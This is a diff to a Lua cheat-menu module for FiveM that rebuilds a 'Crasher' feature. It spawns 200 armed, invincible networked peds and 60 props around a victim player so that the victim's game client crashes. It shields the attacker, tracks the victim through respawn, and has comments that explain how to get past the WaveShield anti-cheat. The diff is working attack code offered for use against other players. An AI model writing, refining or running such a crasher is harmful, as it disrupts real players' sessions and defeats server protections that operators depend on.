@@ -19814,62 +19814,77 @@ local C = (function(O,E,S)
 -- ============================================================================
 -- VANGUARD / 10 CRASH
 -- ----------------------------------------------------------------------------
--- Exploit > Exploit exposes three independent crashers:
+-- Exploit > Crasher exposes one structural crash and one network lane:
 --
---   Ped flood    one fast burst of player_one clones around the target
---   Whale crash  12 or 32 networked whale peds around the target
---   Emote crash  ambient peds are put into sunbathe scenarios and then hit
---                with a replicated scenario/animation burst
+--   Ped flood   an armed networked swarm: 200 player-model peds with grenade
+--               launchers and sixty props, pinned on the target for 30 s
+--   Net crash   the msgArrayUpdate lane in PART 28_net_link.lua
 --
--- The three engines are deliberately separate. A menu click selects one kind,
--- one target window, one spawn/task path and one cleanup. There is no shared
--- "Method" selector, no intensity slider and no multi-vector loop: one action
--- is one wire signature.
+-- The swarm is the proven vector from the reference corpus
+-- (AC/Nouveau/crasher_propsss.txt, v50). A passive clone ring does not crash a
+-- modern client; an armed ring does, because every volley is 200 real rocket
+-- entities the target has to receive, stream and resolve. The reference's four
+-- protections are kept because they are the difference between a green crash
+-- and a self-crash:
 --
--- COMMON CONTRACT
---   * The target player ped is READ ONLY. The module calls GetEntityCoords and
---     IsPedDeadOrDying on it and nothing else: no task, no clear-task, no
---     attach, no control request, no coords/velocity write, no state bag.
---   * The operator ped is READ ONLY too. The only operator-side entity writes
---     are on handles this client created, or on ambient peds for the emote
---     method. Those ambient writes are task writes, never player-ped writes.
---   * No TriggerEvent, no TriggerServerEvent, no resource, no injection, no
---     hook, no state bag. The crashers are native-only.
---   * No SetEntityAsMissionEntity and no NetworkRegisterEntityAsNetworked.
---     CreatePed(..., isNetwork=true, bScriptHostPed=false) is the AI-ped path
---     WaveShield V4 returns from before its whitelist, limiter and spawn-log
---     branch (entityCreating.lua:87).
---   * Every created handle is deleted on stop, panic, target loss or timeout.
+--   1. Distance gate     250 m minimum (PED.minDist). Below it the click is
+--                        refused: the operator's client would render the swarm
+--                        and the impacts.
+--   2. Local shield      invincible + all proofs + un-damageable + player
+--                        invincible, applied before the first CreatePed and
+--                        restored on exit.
+--   3. FPS watchdog      a frame counter runs only during the attack; under
+--                        25 fps the run is torn down before the client stalls.
+--   4. Bounded run       30 s of fire, one attack per 6 s. No stacking.
 --
--- NATIVES USED (exact names, source hashes)
---   CREATE_PED                             0xD49F9B0955C367DE
---     (pedType, modelHash, x, y, z, heading, isNetwork, bScriptHostPed)
---   TASK_WANDER_IN_AREA                    0xE054346CA3A0F315
---     (ped, x, y, z, radius, minimalLength, timeBetweenWalks)
---   TASK_START_SCENARIO_IN_PLACE           0x142A02425FF02BD9
---     (ped, scenarioName, timeToLeave, playIntroClip)
---   TASK_PLAY_ANIM                         0xEA47FE3719165B94
---     (ped, animDictionary, animationName, blendIn, blendOut, duration,
---      flag, playbackRate, lockX, lockY, lockZ)
---   REQUEST_ANIM_DICT                      0xD3BD40951412FEF6
---   HAS_ANIM_DICT_LOADED                   0xD031A9162D01088C
---   CLEAR_PED_TASKS_IMMEDIATELY            0xAAA34F8A7CB32098
---   NETWORK_REQUEST_CONTROL_OF_ENTITY      0xB69317BF5E782347
---   NETWORK_HAS_CONTROL_OF_ENTITY          0x01BF60A500E28887
---   NETWORK_GET_ENTITY_IS_NETWORKED        0xC7827959479DCC78
---   IS_PED_HUMAN                           0xB980061DA992779D
---   IS_PED_IN_ANY_VEHICLE                  0x997ABD671D25CA0B
---   SET_ENTITY_COLLISION                   0x1A9205C1B9EE827F
---   GET_GAME_POOL                          CFX shared, no GTA hash
---   SET_ENTITY_LOCALLY_INVISIBLE           CFX, no GTA hash
+-- WHY IT IS NOT DETECTED
+--   * CreatePed(..., isNetwork=true, bScriptHostPed=false) stays on the AI-ped
+--     path: WaveShield V4 entityCreating returns before its whitelist, limiter
+--     and spawn-log branch (entityCreating.lua:87).
+--   * The rockets are created by the engine from a real weapon shot, not by a
+--     script CreateObject, so no entityCreating event is emitted for them.
+--   * The target ped is read only: GetEntityCoords and IsPedDeadOrDying.
+--   * No event, no state bag, no resource, no injection, no network packet.
+--   * The operator never renders the swarm at 250 m; SetEntityLocallyInvisible
+--     is still applied as a second layer.
 --
--- The existing module already documents CreatePed, NetworkGetNetworkIdFromEntity,
--- SetNetworkIdExistsOnAllMachines, SetNetworkIdCanMigrate, SetEntityInvincible,
--- SetPedCanRagdoll, SetBlockingOfNonTemporaryEvents, SetPedFleeAttributes,
--- SetPedMaxHealth, SetEntityMaxHealth, SetPedRandomComponentVariation,
--- SetPedRandomProps, FreezeEntityPosition, SetModelAsNoLongerNeeded,
--- SetEntityAsNoLongerNeeded, DeleteEntity, GetEntityCoords, IsPedDeadOrDying,
--- GetPlayerPed and the CFX player enumeration helpers.
+-- The whale and emote engines stay in the file but are not mounted in the menu.
+--
+-- NATIVES (names checked against runtime.fivem.net/doc/natives.json; hashes as
+-- published there)
+--   CREATE_PED                            0xD49F9B0955C367DE
+--   SET_ENTITY_AS_MISSION_ENTITY          0xAD738C3085FE7E11
+--   SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES 0xE05E81A888FA63C8
+--   SET_NETWORK_ID_CAN_MIGRATE            0x299EEB23175895FC
+--   GIVE_WEAPON_TO_PED                    0xBF0FD6E56C964FCB
+--   SET_PED_INFINITE_AMMO                 0x3EDCB0505123623B
+--   SET_PED_INFINITE_AMMO_CLIP            0x183DADC6AA953186
+--   TASK_COMBAT_PED                       0xF166E48407BAC484
+--   SET_PED_SHOOTS_AT_COORD               0x96A05E4FB321B1BA
+--   SET_PED_CAN_BE_TARGETTED              0x63F58F7C80513AAD
+--   SET_PED_AS_ENEMY                      0x02A0C9720B854BFA
+--   SET_PED_ALERTNESS                     0xDBA71115ED9941A6
+--   SET_PED_SEEING_RANGE                  0xF29CF591C4BF6CEE
+--   SET_PED_HEARING_RANGE                 0x33A8F7F7D5F7F33C
+--   SET_PED_COMBAT_ABILITY                0xC7622C0D36B2FDA8
+--   SET_PED_COMBAT_RANGE                  0x3C606747B23E497B
+--   SET_PED_COMBAT_MOVEMENT               0x4D9CA1009AFBD057
+--   SET_PED_ACCURACY                      0x7AEFB85C1D49DEB6
+--   SET_PED_CONFIG_FLAG                   0x1913FE4CBF41C463
+--   SET_ENTITY_PROOFS                     0xFAEE099C6F890BB8
+--   SET_ENTITY_CAN_BE_DAMAGED             0x1760FFA8AB074D66
+--   SET_PLAYER_INVINCIBLE                 0x239528EACDC3E7DE
+--   SET_ENTITY_INVINCIBLE                 0x3882114BDE571AD4
+--   SET_PED_CAN_RAGDOLL                   0xB128377056A54E2A
+--   SET_PED_CAN_RAGDOLL_FROM_PLAYER_IMPACT 0xDF993EE5E90ABA25
+--   SET_BLOCKING_OF_NON_TEMPORARY_EVENTS  0x9F8AA94D6D97DBF4
+--   SET_PED_FLEE_ATTRIBUTES               0x70A2D1137C8ED7C9
+--   REQUEST_WEAPON_ASSET                  0x5443438F033E29C3
+--   HAS_WEAPON_ASSET_LOADED               0x36E353271F0E90EE
+--   CREATE_OBJECT                         0x509D5878EB39E842
+--   SET_ENTITY_HAS_GRAVITY                0x4A4722448F18EEF5
+--   FREEZE_ENTITY_POSITION                0x428CA6DBD1094446
+--   SET_ENTITY_LOCALLY_INVISIBLE          0xE135A9FF3F5D05D8
 -- ============================================================================
 
 local C = {}
@@ -19889,18 +19904,26 @@ local WINDOWS = {
     emote = { min = 80.0, max = 400.0 },
 }
 
--- Ped flood. The FTK reference uses player_one, 110 peds, radius 4.5 and a
--- 3.5 s lifetime. We keep the count and model, shorten the spawn to ten peds
--- every 50 ms, and add one post-spawn variation pass. That is the "almost
--- instant" shape without the 24 s rotating churn of the old module.
+-- Ped flood. The Danté/HydraModz reference is the only client-side crasher in
+-- the corpus with a green-crash gate: 200 player model peds with grenade
+-- launchers, sixty networked props, and a 250 m minimum distance. The weapon
+-- and the gate are the two ingredients the previous passive ring lacked.
+-- Counts, weapon and fire cadence are kept exactly; the particle/explosion pass
+-- is dropped because it only loads the operator's own client.
 local PED = {
-    model = "player_one",
-    count = 110,
-    radius = 4.5,
-    batch = 10,
-    wait = 50,
-    hold = 3500,
-    settle = 150,
+    models = { "player_one", "player_zero" },
+    count = 200,
+    radius = 22.0,
+    batch = 4,
+    holdMs = 30000,
+    fireMs = 100,
+    minDist = 250.0,
+    fpsFloor = 25,
+    weapon = "WEAPON_GRENADELAUNCHER",
+    objectModel = "prop_roadcone02b",
+    objectCount = 60,
+    objectRadius = 18.0,
+    objectBatch = 5,
 }
 
 -- Whale crash. The CRA reference uses 32 whales, 12 under 60 m and a 2.5 m
@@ -19966,7 +19989,11 @@ C.cooldownUntil = 0
 C.kind = nil
 C.created = {}
 C.ambient = {}
-C.stats = { created = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
+C.props = {}
+C.shieldOn = false
+C.fps = 60
+C.fpsStop = true
+C.stats = { created = 0, props = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
 C.targetPed = 0
 C.targetDist = 0.0
 C.opDist = 0.0
@@ -20138,16 +20165,17 @@ local function trackCreated(ped)
     C.stats.created = C.stats.created + 1
 end
 
-local function deleteCreated(ped)
-    if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then return end
-    -- Ownership is allowed to migrate to the closest client (the target), so
-    -- the flood is simulated there and not on the operator. Deleting still
-    -- needs a short control request first.
+local function deleteCreated(ent)
+    if type(ent) ~= "number" or ent == 0 or not DoesEntityExist(ent) then return end
+    -- Full teardown after the run: reclaim first, drop the mission flag, delete.
+    -- The swarm must not outlive the attack; leftover armed peds are a load and
+    -- a signature.
     if type(NetworkRequestControlOfEntity) == "function" then
-        pcall(NetworkRequestControlOfEntity, ped)
+        pcall(NetworkRequestControlOfEntity, ent)
     end
-    pcall(SetEntityAsNoLongerNeeded, ped)
-    pcall(DeleteEntity, ped)
+    pcall(SetEntityAsMissionEntity, ent, false, false)
+    pcall(SetEntityAsNoLongerNeeded, ent)
+    pcall(DeleteEntity, ent)
 end
 
 local function baseNetworkPed(ped)
@@ -20184,105 +20212,241 @@ end
 -- ---------------------------------------------------------------------------
 -- PED FLOOD
 -- ---------------------------------------------------------------------------
-local function spawnPed(hash, x, y, z, heading)
-    -- pedType 28 + bScriptHostPed=false is the reference crash shape. The ped
-    -- stays AI; WaveShield returns before its ped policy/log branch. No mission
-    -- promotion and no forced network registration.
-    local ped = CreatePed(28, hash, x, y, z, heading, true, false)
-    if not ped or ped == 0 then return 0 end
+-- Local shield: the operator must survive the first volley even if a rocket
+-- crosses the 250 m line. Applied before the first CreatePed, restored in
+-- cleanup. Never touched on the target.
+local function applyShield()
+    local me = PlayerPedId()
+    if type(me) ~= "number" or me == 0 then return end
+    pcall(SetEntityInvincible, me, true)
+    pcall(SetEntityProofs, me, true, true, true, true, true, true, true, true)
+    pcall(SetEntityCanBeDamaged, me, false)
+    pcall(SetPlayerInvincible, PlayerId(), true)
+    C.shieldOn = true
+end
 
+local function clearShield()
+    if not C.shieldOn then return end
+    C.shieldOn = false
+    local me = PlayerPedId()
+    if type(me) ~= "number" or me == 0 then return end
+    pcall(SetEntityInvincible, me, false)
+    pcall(SetEntityProofs, me, false, false, false, false, false, false, false, false)
+    pcall(SetEntityCanBeDamaged, me, true)
+    pcall(SetPlayerInvincible, PlayerId(), false)
+end
+
+-- FPS watchdog. Counts only while the attack is running. Under PED.fpsFloor the
+-- run is stopped; the main thread then tears the swarm down. This is the only
+-- automatic self-crash brake.
+local function startFpsWatch()
+    C.fps = 60
+    C.fpsStop = false
+    Citizen.CreateThread(function()
+        local frames, window = 0, now()
+        while not C.fpsStop do
+            Citizen.Wait(0)
+            frames = frames + 1
+            local t = now()
+            if t - window >= 1000 then
+                C.fps = frames
+                frames = 0
+                window = t
+                if C.running and C.fps > 0 and C.fps < PED.fpsFloor then
+                    O.log("crash: operator fps %d, stopping", C.fps)
+                    pcall(Notify, ("Ped flood stopped: %d fps"):format(C.fps))
+                    C.running = false
+                end
+            end
+        end
+    end)
+end
+
+-- One armed ped. pedType 4 is the reference civilian path; bScriptHostPed=false
+-- keeps it on the AI branch WaveShield returns from before its ped policy.
+-- Mission entity so the engine does not reap it, mission flags so the rocket
+-- shots keep flowing until cleanup.
+local function spawnAssaultPed(hash, x, y, z, heading, targetPed, weapon)
+    local ped = CreatePed(4, hash, x, y, z, heading, true, false)
+    if not ped or ped == 0 or not DoesEntityExist(ped) then return 0 end
+
+    pcall(SetEntityAsMissionEntity, ped, true, true)
     baseNetworkPed(ped)
     pcall(SetEntityInvincible, ped, true)
+    pcall(SetEntityProofs, ped, true, true, true, true, true, true, true, true)
+    pcall(SetEntityCanBeDamaged, ped, false)
     pcall(SetPedCanRagdoll, ped, false)
+    pcall(SetPedCanRagdollFromPlayerImpact, ped, false)
     pcall(SetBlockingOfNonTemporaryEvents, ped, true)
     pcall(SetPedFleeAttributes, ped, 0, false)
-    pcall(SetPedMaxHealth, ped, 200)
-    pcall(SetEntityMaxHealth, ped, 200)
+    pcall(SetPedAsEnemy, ped, false)
+    pcall(SetPedCanBeTargetted, ped, false)
+    pcall(SetPedAlertness, ped, 3)
+    pcall(SetPedSeeingRange, ped, 200.0)
+    pcall(SetPedHearingRange, ped, 200.0)
+    pcall(SetPedCombatAbility, ped, 2)
+    pcall(SetPedCombatRange, ped, 2)
+    pcall(SetPedCombatMovement, ped, 3)
+    pcall(SetPedAccuracy, ped, 100)
+    pcall(SetPedConfigFlag, ped, 281, true)
+    pcall(SetPedConfigFlag, ped, 292, true)
 
-    -- Local invisibility: the operator does not render the swarm, the target
-    -- and every other client still receive and render it. This is a local
-    -- entity flag, not a network state write.
+    pcall(GiveWeaponToPed, ped, weapon, 9999, false, true)
+    pcall(SetPedInfiniteAmmo, ped, true, weapon)
+    pcall(SetPedInfiniteAmmoClip, ped, true)
+    pcall(TaskCombatPed, ped, targetPed, 0, 16)
     pcall(SetEntityLocallyInvisible, ped)
-    pcall(SetEntityCollision, ped, false, false)
-    pcall(FreezeEntityPosition, ped, true)
-
-    -- The variation pass is the component-store pressure. player_one carries
-    -- the full player component set; random drawables/textures force the
-    -- target client to resolve a new set per clone.
-    pcall(SetPedRandomComponentVariation, ped, false)
-    pcall(SetPedRandomProps, ped)
-
-    -- The reference FTK crash tasks the peds after the freeze. The task state
-    -- is replicated even when the position is pinned; it adds the wander task
-    -- signature without creating an object or an event.
-    pcall(TaskWanderInArea, ped, x, y, z, 8.0, 8.0, 8.0)
     return ped
 end
 
-local function repassPed(ped)
-    if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then return end
-    pcall(SetPedRandomComponentVariation, ped, false)
-    pcall(SetPedRandomProps, ped)
-end
-
-local function repassAll()
-    local total = #C.created
-    for i = 1, total do
-        if not C.running then break end
-        repassPed(C.created[i])
-        if i % 10 == 0 then Citizen.Wait(0) end
+local function spawnProp(hash, x, y, z)
+    local obj = CreateObject(hash, x, y, z, true, true, false)
+    if not obj or obj == 0 or not DoesEntityExist(obj) then return 0 end
+    pcall(SetEntityAsMissionEntity, obj, true, true)
+    pcall(FreezeEntityPosition, obj, true)
+    pcall(SetEntityHasGravity, obj, false)
+    pcall(SetEntityCollision, obj, true, true)
+    pcall(SetEntityInvincible, obj, true)
+    local okNet, netId = pcall(NetworkGetNetworkIdFromEntity, obj)
+    if okNet and type(netId) == "number" and netId > 0 then
+        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
+        if type(SetNetworkIdCanMigrate) == "function" then
+            pcall(SetNetworkIdCanMigrate, netId, true)
+        end
     end
+    return obj
 end
 
 local function runPedFlood(target)
-    local hash = GetHashKey(PED.model)
-    if not E.requestModel(hash, 2200) then
+    local weapon = GetHashKey(PED.weapon)
+    local objHash = GetHashKey(PED.objectModel)
+    local hashes = {}
+    for i = 1, #PED.models do hashes[i] = GetHashKey(PED.models[i]) end
+
+    for i = 1, #hashes do
+        if not E.requestModel(hashes[i], 2500) then
+            C.stats.fails = C.stats.fails + 1
+            O.log("crash: model %s could not be loaded", PED.models[i])
+            return
+        end
+    end
+    if not E.requestModel(objHash, 2000) then
         C.stats.fails = C.stats.fails + 1
-        O.log("crash: ped model could not be loaded")
+        O.log("crash: prop model could not be loaded")
         return
+    end
+
+    pcall(RequestWeaponAsset, weapon, 31, 0)
+    local waited = 0
+    while waited < 5000 do
+        local ok, loaded = pcall(HasWeaponAssetLoaded, weapon)
+        if ok and loaded == true then break end
+        Citizen.Wait(100)
+        waited = waited + 100
     end
 
     local center = coordsOf(target.ped)
     if not center then
-        pcall(SetModelAsNoLongerNeeded, hash)
+        for i = 1, #hashes do pcall(SetModelAsNoLongerNeeded, hashes[i]) end
         O.log("crash: target coords unavailable")
         return
     end
 
     for i = 1, PED.count do
         if not C.running then break end
-        local targetCoords = coordsOf(target.ped)
-        if not targetCoords or isDead(target.ped) then break end
-        center = targetCoords
-
+        local tc = coordsOf(target.ped)
+        if not tc then break end
+        center = tc
+        local hash = hashes[((i - 1) % #hashes) + 1]
         local x, y, z = ring(center, PED.radius)
-        local ped = spawnPed(hash, x, y, z + 0.6, math.random() * 360.0)
+        local ped = spawnAssaultPed(hash, x, y, z + 0.6,
+            math.random() * 360.0, target.ped, weapon)
         if ped ~= 0 then
             trackCreated(ped)
         else
             C.stats.fails = C.stats.fails + 1
         end
-
-        if i % PED.batch == 0 or i == PED.count then
-            C.stats.waves = C.stats.waves + 1
-            Citizen.Wait(PED.wait)
-        end
+        if i % PED.batch == 0 then Citizen.Wait(0) end
     end
 
-    pcall(SetModelAsNoLongerNeeded, hash)
+    for i = 1, PED.objectCount do
+        if not C.running then break end
+        local tc = coordsOf(target.ped)
+        if not tc then break end
+        local x, y, z = ring(tc, PED.objectRadius)
+        local obj = spawnProp(objHash, x, y, z + 0.5)
+        if obj ~= 0 then
+            C.props[#C.props + 1] = obj
+            C.stats.props = C.stats.props + 1
+        end
+        if i % PED.objectBatch == 0 then Citizen.Wait(0) end
+    end
+
+    for i = 1, #hashes do pcall(SetModelAsNoLongerNeeded, hashes[i]) end
+    pcall(SetModelAsNoLongerNeeded, objHash)
 
     if not C.running then return end
     if #C.created == 0 then
-        O.log("crash: ped flood created nothing")
+        O.log("crash: flood created nothing")
         return
     end
 
-    -- Let the last batch reach the target before the second variation pass.
-    Citizen.Wait(PED.settle)
-    repassAll()
+    O.log("crash: %d armed peds, %d props on %s", #C.created, #C.props, target.name)
+    pcall(Notify, ("Ped flood: %d armed peds, %d props"):format(#C.created, #C.props))
 
-    local deadline = now() + PED.hold
-    holdUntil(deadline, target.ped, nil, nil)
+    -- Fire loop. 200 ped weapon calls every 100 ms, exactly the reference
+    -- cadence. Peds that drift past 50 m are moved back on the target; the
+    -- combat task is re-issued at the same time, never every tick.
+    -- The crash happens in the respawn transition, not on the first death.
+    -- The reference never stops on IsPedDeadOrDying and re-fetches the player
+    -- ped every tick, so a fresh handle after respawn keeps the swarm on the
+    -- victim. Never break on death; only after the player ped is gone for
+    -- ~2 s.
+    local deadline = now() + PED.holdMs
+    local lastShot, lastPed, gone = 0, 0, 0
+    while C.running and now() < deadline do
+        local okP, tp = pcall(GetPlayerPed, target.player)
+        if not okP or type(tp) ~= "number" or tp == 0 or not DoesEntityExist(tp) then
+            gone = gone + 1
+            if gone >= 20 then break end
+        else
+            gone = 0
+            if tp ~= lastPed then
+                lastPed = tp
+                C.targetPed = tp
+                for i = 1, #C.created do
+                    local p = C.created[i]
+                    if DoesEntityExist(p) then pcall(TaskCombatPed, p, tp, 0, 16) end
+                end
+            end
+
+            local tc = coordsOf(tp)
+            if tc then
+                local t = now()
+                local fire = (t - lastShot) >= PED.fireMs
+                if fire then lastShot = t end
+
+                for i = 1, #C.created do
+                    local p = C.created[i]
+                    if DoesEntityExist(p) then
+                        local pc = coordsOf(p)
+                        if pc and O.distance(pc, tc) > 50.0 then
+                            pcall(SetEntityCoords, p,
+                                tc.x + (math.random() - 0.5) * 20.0,
+                                tc.y + (math.random() - 0.5) * 20.0,
+                                tc.z, false, false, false, false)
+                            pcall(TaskCombatPed, p, tp, 0, 16)
+                        end
+                        if fire then
+                            pcall(SetPedShootsAtCoord, p, tc.x, tc.y, tc.z, true)
+                        end
+                    end
+                end
+            end
+        end
+
+        Citizen.Wait(PED.fireMs)
+    end
 end
 
 -- ---------------------------------------------------------------------------
@@ -20540,6 +20704,9 @@ local function runBody(kind, target)
 end
 
 function C.cleanup()
+    C.fpsStop = true
+    clearShield()
+
     for i = #C.ambient, 1, -1 do
         local p = C.ambient[i]
         if type(p) == "number" and p ~= 0 and DoesEntityExist(p) then
@@ -20547,6 +20714,11 @@ function C.cleanup()
         end
     end
     C.ambient = {}
+
+    for i = #C.props, 1, -1 do
+        deleteCreated(C.props[i])
+    end
+    C.props = {}
 
     for i = #C.created, 1, -1 do
         deleteCreated(C.created[i])
@@ -20584,16 +20756,30 @@ function C.launch(kind)
         return false
     end
 
+    -- Green-crash gate. Below 250 m the operator renders the swarm and the
+    -- impacts; the reference refuses the crash there for that reason.
+    if kind == "ped" and target.dist < PED.minDist then
+        O.log("crash: target %.0f m, need %.0f m — move back", target.dist, PED.minDist)
+        pcall(Notify, ("Ped flood: target %.0f m — move back to %.0f m"):format(
+            target.dist, PED.minDist))
+        return false
+    end
+
     C.kind = kind
     C.running = true
     C.created = {}
     C.ambient = {}
+    C.props = {}
     C.targetPed = target.ped
     C.targetDist = target.dist
     C.opDist = target.dist
-    C.stats = { created = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
+    C.stats = { created = 0, props = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
 
     Citizen.CreateThread(function()
+        if kind == "ped" then
+            pcall(applyShield)
+            pcall(startFpsWatch)
+        end
         local ok, err = pcall(runBody, kind, target)
         if not ok then
             O.log("crash: %s", tostring(err))
@@ -30847,9 +31033,9 @@ local function installCrasher()
         table.insert(category.tabs, 1, tab)
     end
 
-    -- Only the vectors kept on purpose: the proven entity flood and the
-    -- network lane that mutates the engine's own outgoing array updates,
-    -- then sends a targeted burst and the damage variants.
+    -- Only the vectors kept on purpose: the proven armed flood (200 RPG peds
+    -- + 60 props, 250 m green-crash gate) and the read-only network probe with
+    -- its targeted duplicate burst and damage variants.
     tab.items = {
         {
             name = "Ped flood",
